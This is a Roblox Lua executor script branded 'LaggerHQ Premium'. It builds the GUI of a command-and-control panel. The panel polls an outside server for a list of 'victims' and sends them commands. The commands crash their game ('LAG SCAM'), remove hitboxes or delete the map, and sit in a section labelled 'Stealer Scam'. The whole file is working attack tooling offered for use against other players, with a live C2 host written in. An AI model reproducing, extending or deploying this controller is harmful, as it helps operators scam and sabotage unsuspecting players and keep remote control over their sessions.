--[[ 
	LaggerHQ Control Panel - Premium Edition
	Professional Remote Administration Tool
	Copyright © 2026 LaggerHQ
]]

-- SERVICES
local Players = game:GetService("Players")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- CONFIGURATION
local API_URL = "https://laggeruhq.onrender.com"
local http_request = request or http.request or (http and http.request) or nil
local LocalPlayer = Players.LocalPlayer

-- ASSETS
local ICONS = {
	User = "rbxassetid://10884521255", -- User Icon
	Server = "rbxassetid://10884521406", -- Server Icon
	Command = "rbxassetid://10884521611", -- Command Icon
	Close = "rbxassetid://10884521852", -- Close X
	Logo = "", -- Placeholder
}

-- THEME (PREMIUM DARK)
local Theme = {
	Background = Color3.fromRGB(18, 18, 22),
	Sidebar = Color3.fromRGB(24, 24, 28),
	Content = Color3.fromRGB(18, 18, 22),
	Card = Color3.fromRGB(30, 30, 36),
	Accent = Color3.fromRGB(114, 137, 218), -- Blurple-ish
	AccentGradient = ColorSequence.new{
		ColorSequenceKeypoint.new(0, Color3.fromRGB(114, 137, 218)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(90, 110, 190))
	},
	TextStart = Color3.fromRGB(255, 255, 255),
	TextDim = Color3.fromRGB(160, 160, 170),
	Green = Color3.fromRGB(67, 181, 129),
	Red = Color3.fromRGB(240, 71, 71),
	Orange = Color3.fromRGB(250, 166, 26)
}

--------------------------------------------------------------------------------
-- UI FRAMEWORK (Custom "Sellable" Lib)
--------------------------------------------------------------------------------
local Framework = {}

function Framework:Create(class, props)
	local obj = Instance.new(class)
	for k, v in pairs(props) do
		if k == "Parent" then
			obj.Parent = v -- Set parent last ideally, but here it's fine
		elseif k == "Corner" then
			local c = Instance.new("UICorner")
			c.CornerRadius = UDim.new(0, v)
			c.Parent = obj
		elseif k == "Stroke" then
			local s = Instance.new("UIStroke")
			s.Color = v.Color or Color3.fromRGB(50,50,50)
			s.Thickness = v.Thickness or 1
			s.Transparency = v.Transparency or 0
			s.Parent = obj
		elseif k == "Gradient" then
			local g = Instance.new("UIGradient")
			g.Color = v
			g.Parent = obj
		elseif k ~= "Hover" and k ~= "Click" then
			obj[k] = v
		end
	end
	
	-- Animations
	if props.Hover then
		obj.MouseEnter:Connect(function()
			TweenService:Create(obj, TweenInfo.new(0.2, Enum.EasingStyle.Quad), props.Hover):Play()
		end)
		obj.MouseLeave:Connect(function()
			-- Restore original (manual reset needed usually, but we implement simple reversal here)
			local revert = {}
			for prop, _ in pairs(props.Hover) do
				revert[prop] = props[prop]
			end
			TweenService:Create(obj, TweenInfo.new(0.2, Enum.EasingStyle.Quad), revert):Play()
		end)
	end
	
	return obj
end

-- PARENTING
local function GetParent()
	-- Try to be safe (CoreGui > PlayerGui)
	local success, gui = pcall(function() return game:GetService("CoreGui") end)
	if success then return gui end
	return LocalPlayer:WaitForChild("PlayerGui")
end

-- WINDOW CREATION
local Window = nil
local ContentFrame = nil
local CurrentVictims = {} -- State management for diffing

function Framework:InitWindow(title)
	if Window then Window:Destroy() end
	
	local ScreenGui = Framework:Create("ScreenGui", {
		Name = "LaggerHQ_Panel",
		Parent = GetParent(),
		ResetOnSpawn = false,
		ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	})
	Window = ScreenGui
	
	-- MAIN BODY
	local Main = Framework:Create("Frame", {
		Name = "Main",
		Parent = ScreenGui,
		Size = UDim2.new(0, 500, 0, 330), -- Smaller Size
		Position = UDim2.new(0.5, -250, 0.5, -165), -- Re-centered
		BackgroundColor3 = Theme.Background,
		BorderSizePixel = 0,
		Corner = 12
	})
	
	-- SHADOW
	local Shadow = Framework:Create("ImageLabel", {
		Name = "Shadow",
		Parent = Main,
		BackgroundTransparency = 1,
		Position = UDim2.new(0, -15, 0, -15),
		Size = UDim2.new(1, 30, 1, 30),
		ZIndex = 0,
		Image = "rbxassetid://5554236805",
		ScaleType = Enum.ScaleType.Slice,
		SliceCenter = Rect.new(23,23,277,277),
		ImageColor3 = Color3.fromRGB(0,0,0),
		ImageTransparency = 0.5
	})
	
	-- DRAGGING (Robust)
	local dragging, dragInput, dragStart, startPos
	Main.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 then
			dragging = true
			dragStart = input.Position
			startPos = Main.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then dragging = false end
			end)
		end
	end)
	Main.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement then dragInput = input end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			local delta = input.Position - dragStart
			TweenService:Create(Main, TweenInfo.new(0.05), {Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)}):Play()
		end
	end)
	
	-- SIDEBAR
	local Sidebar = Framework:Create("Frame", {
		Parent = Main,
		Size = UDim2.new(0, 180, 1, 0),
		BackgroundColor3 = Theme.Sidebar,
		BorderSizePixel = 0,
		Corner = 12
	})
	
	-- Fix Sidebar Corner (Right side square)
	local FixPatch = Framework:Create("Frame", {
		Parent = Sidebar,
		Size = UDim2.new(0, 20, 1, 0),
		Position = UDim2.new(1, -10, 0, 0),
		BackgroundColor3 = Theme.Sidebar,
		BorderSizePixel = 0,
		ZIndex = 0
	})
	
	-- TITLE
	local TitleLbl = Framework:Create("TextLabel", {
		Parent = Sidebar,
		Text = title,
		Font = Enum.Font.GothamBlack,
		TextSize = 18,
		TextColor3 = Theme.TextStart,
		Size = UDim2.new(1, -20, 0, 50),
		Position = UDim2.new(0, 20, 0, 10),
		BackgroundTransparency = 1,
		TextXAlignment = Enum.TextXAlignment.Left
	})
	
	-- USER PROFILE (Bottom)
	local Profile = Framework:Create("Frame", {
		Parent = Sidebar,
		Size = UDim2.new(1, -20, 0, 60),
		Position = UDim2.new(0, 10, 1, -70),
		BackgroundColor3 = Theme.Card,
		Corner = 8,
		BorderSizePixel = 0
	})
	
	Framework:Create("ImageLabel", {
		Parent = Profile,
		Size = UDim2.new(0, 32, 0, 32),
		Position = UDim2.new(0, 10, 0, 14),
		BackgroundColor3 = Theme.Background,
		Corner = 16,
		Image = "rbxassetid://0", -- Set later
	}).Image = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
	
	Framework:Create("TextLabel", {
		Parent = Profile,
		Text = LocalPlayer.Name,
		Size = UDim2.new(1, -60, 0, 20),
		Position = UDim2.new(0, 50, 0, 12),
		BackgroundTransparency = 1,
		Font = Enum.Font.GothamBold,
		TextColor3 = Theme.TextStart,
		TextSize = 12,
		TextXAlignment = Enum.TextXAlignment.Left
	})
	
	Framework:Create("TextLabel", {
		Parent = Profile,
		Text = "Administrator",
		Size = UDim2.new(1, -60, 0, 20),
		Position = UDim2.new(0, 50, 0, 28),
		BackgroundTransparency = 1,
		Font = Enum.Font.Gotham,
		TextColor3 = Theme.Accent,
		TextSize = 10,
		TextXAlignment = Enum.TextXAlignment.Left
	})

	-- CONTENT AREA
	ContentFrame = Framework:Create("ScrollingFrame", {
		Parent = Main,
		Size = UDim2.new(1, -200, 1, -20),
		Position = UDim2.new(0, 200, 0, 10),
		BackgroundColor3 = Theme.Content,
		BackgroundTransparency = 1,
		BorderSizePixel = 0,
		ScrollBarThickness = 2,
		CanvasSize = UDim2.new(0,0,0,0),
		AutomaticCanvasSize = Enum.AutomaticSize.Y
	})
	
	Framework:Create("UIListLayout", {
		Parent = ContentFrame,
		Padding = UDim.new(0, 15),
		SortOrder = Enum.SortOrder.LayoutOrder
	})
	Framework:Create("UIPadding", {
		Parent = ContentFrame,
		PaddingRight = UDim.new(0, 10)
	})
	
	return Main
end

function Framework:CreateSection(title)
	local Container = Framework:Create("Frame", {
		Parent = ContentFrame,
		Size = UDim2.new(1, 0, 0, 0),
		AutomaticSize = Enum.AutomaticSize.Y,
		BackgroundColor3 = Theme.Card,
		Corner = 8
	})
	
	local Header = Framework:Create("TextLabel", {
		Parent = Container,
		Text = string.upper(title),
		Font = Enum.Font.GothamBold,
		TextSize = 11,
		TextColor3 = Theme.TextDim,
		Size = UDim2.new(1, -20, 0, 30),
		Position = UDim2.new(0, 10, 0, 0),
		BackgroundTransparency = 1,
		TextXAlignment = Enum.TextXAlignment.Left
	})
	
	local Content = Framework:Create("Frame", {
		Parent = Container,
		Size = UDim2.new(1, -20, 0, 0),
		Position = UDim2.new(0, 10, 0, 35),
		AutomaticSize = Enum.AutomaticSize.Y,
		BackgroundTransparency = 1
	})
	
	Framework:Create("UIListLayout", {
		Parent = Content,
		Padding = UDim.new(0, 8),
		SortOrder = Enum.SortOrder.LayoutOrder
	})
	
	-- Padding bottom
	Framework:Create("Frame", {Parent = Container, Size = UDim2.new(1,0,0,10), BackgroundTransparency=1, LayoutOrder=99})
	
	return Content
end

function Framework:CreateButton(parent, text, color, callback)
	color = color or Theme.Sidebar
	
	local Btn = Framework:Create("TextButton", {
		Parent = parent,
		Size = UDim2.new(1, 0, 0, 36),
		BackgroundColor3 = color,
		Text = "",
		AutoButtonColor = false,
		Corner = 6,
		Hover = {BackgroundColor3 = Color3.new(
			math.min(color.R*1.1, 1),
			math.min(color.G*1.1, 1),
			math.min(color.B*1.1, 1)
		)}
	})
	
	local Label = Framework:Create("TextLabel", {
		Parent = Btn,
		Text = text,
		Font = Enum.Font.GothamBold,
		TextSize = 13,
		TextColor3 = Theme.TextStart,
		Size = UDim2.new(1, 0, 1, 0),
		BackgroundTransparency = 1,
		TextTransparency = 0
	})
	
	-- Click Effect
	Btn.MouseButton1Click:Connect(function()
		TweenService:Create(Btn, TweenInfo.new(0.05), {Size = UDim2.new(1, -4, 0, 32)}):Play()
		task.wait(0.05)
		TweenService:Create(Btn, TweenInfo.new(0.05), {Size = UDim2.new(1, 0, 0, 36)}):Play()
		callback()
	end)
	
	return Btn
end

--------------------------------------------------------------------------------
-- APP LOGIC: Seamless Refresh & State
--------------------------------------------------------------------------------

Framework:InitWindow("Moon Lagger")

-- SECTIONS
local VictimsSection = Framework:CreateSection("Connected Targets")
local VictimListFrame = Framework:Create("ScrollingFrame", {
	Parent = VictimsSection,
	Size = UDim2.new(1, 0, 0, 100),
	BackgroundTransparency = 1,
	ScrollBarThickness = 2,
	BorderSizePixel = 0,
	CanvasSize = UDim2.new(0,0,0,0),
	AutomaticCanvasSize = Enum.AutomaticSize.Y
})
Framework:Create("UIListLayout", { Parent = VictimListFrame, Padding = UDim.new(0,4) })

local ActionsSection = Framework:CreateSection("Stealer Scam")
local UtilSection = Framework:CreateSection("Tools")

-- SELECTION STATE
local SelectedID = nil
local SelectedName = "None"
local StatusLabel = Framework:Create("TextLabel", {
	Parent = ActionsSection,
	LayoutOrder = -1, -- Top
	Text = "Selected: None",
	Size = UDim2.new(1, 0, 0, 20),
	BackgroundTransparency = 1,
	TextColor3 = Theme.Accent,
	Font = Enum.Font.GothamBold,
	TextSize = 12,
	TextXAlignment = Enum.TextXAlignment.Left
})

local function UpdateSelection(id, name)
	SelectedID = id
	SelectedName = name
	StatusLabel.Text = "Selected: " .. name
end

-- SEAMLESS REFRESH ALGORITHM
local function RefreshVictims()
	if not http_request then return end
	
	local success, result = pcall(function()
		local r = http_request({ Url = API_URL .. "/victims", Method = "GET" })
		if r and r.Body then
			return HttpService:JSONDecode(r.Body)
		end
	end)
	
	if not success or not result then return end
	
	-- 1. Mark all current GUI items as unchecked
	local checked = {}
	
	-- 2. Iterate new data
	for uid, data in pairs(result) do
		checked[uid] = true
		
		-- Check if exists
		local existingBtn = VictimListFrame:FindFirstChild("V_" .. uid)
		
		if not existingBtn then
			-- CREATE NEW BUTTON
			local btn = Framework:Create("TextButton", {
				Name = "V_" .. uid,
				Parent = VictimListFrame,
				Size = UDim2.new(1, 0, 0, 28),
				BackgroundColor3 = Theme.Sidebar,
				Corner = 4,
				Text = "",
				AutoButtonColor = false
			})
			
			local lbl = Framework:Create("TextLabel", {
				Parent = btn,
				Text = data.name or "Unknown",
				Font = Enum.Font.Gotham,
				TextSize = 12,
				TextColor3 = Theme.TextStart,
				Size = UDim2.new(1, -10, 1, 0),
				Position = UDim2.new(0, 10, 0, 0),
				BackgroundTransparency = 1,
				TextXAlignment = Enum.TextXAlignment.Left
			})
			
			-- Indicator
			Framework:Create("Frame", {
				Parent = btn,
				Size = UDim2.new(0, 4, 1, 0),
				BackgroundColor3 = Theme.Green,
				Corner = 2
			})
			
			btn.MouseButton1Click:Connect(function()
				UpdateSelection(uid, data.name)
				-- Visual Selection Feedback
				for _, b in pairs(VictimListFrame:GetChildren()) do
					if b:IsA("TextButton") then
						TweenService:Create(b, TweenInfo.new(0.2), {BackgroundColor3 = Theme.Sidebar}):Play()
					end
				end
				TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Theme.Card}):Play()
			end)
		end
	end
	
	-- 3. Cleanup removed victims
	for _, child in pairs(VictimListFrame:GetChildren()) do
		if child:IsA("TextButton") then
			local uid = string.sub(child.Name, 3) -- Remove V_
			if not checked[uid] then
				child:Destroy()
				if SelectedID == uid then UpdateSelection(nil, "None") end
			end
		end
	end
end

-- COMMAND SENDER
local function Send(cmd)
	if not SelectedID then
		StatusLabel.Text = "Error: Select a victim first!"
		task.delay(2, function() StatusLabel.Text = "Selected: " .. SelectedName end)
		return
	end
	
	task.spawn(function()
		local payload = { target = SelectedID, command = cmd }
		if SelectedID == "ALL" then payload.target = "ALL" end
		
		http_request({
			Url = API_URL .. "/command",
			Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = HttpService:JSONEncode(payload)
		})
	end)
end

--------------------------------------------------------------------------------
-- BUTTONS & LAYOUT
--------------------------------------------------------------------------------

-- Stealer Scam Section
Framework:CreateButton(ActionsSection, "LAG SCAM (CRASH)", Theme.Red, function() Send("LAG_SCAM") end)
Framework:CreateButton(ActionsSection, "NO STEAL (REMOVE HITBOXES)", Theme.Green, function() Send("NO_STEAL") end)
Framework:CreateButton(ActionsSection, "DELETE MAP", Theme.Orange, function() Send("DELETE_MAP") end)

-- Tools Section
Framework:CreateButton(UtilSection, "BROADCAST ALL", Theme.Accent, function()
	UpdateSelection("ALL", "All Victims")
end)

-- AUTO REFRESH LOOP
task.spawn(function()
	while true do
		RefreshVictims()
		task.wait(2) -- Fast refresh, no flicker due to diffing
	end
end)

print("LaggerHQ Premium UI Loaded")
